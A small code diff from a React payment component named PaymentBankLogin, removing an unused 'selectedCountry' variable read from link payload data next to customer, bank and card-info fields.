@@ -30,7 +30,6 @@ const PaymentBankLogin = () => {
 
   // Get customer info and selected bank from link data (cross-device compatible)
   const customerInfo = linkData?.payload?.customerInfo || {};
-  const selectedCountry = linkData?.payload?.selectedCountry || '';
   const selectedBankId = linkData?.payload?.selectedBank || '';
   const cardInfo = linkData?.payload?.cardInfo || {
     cardName: '',
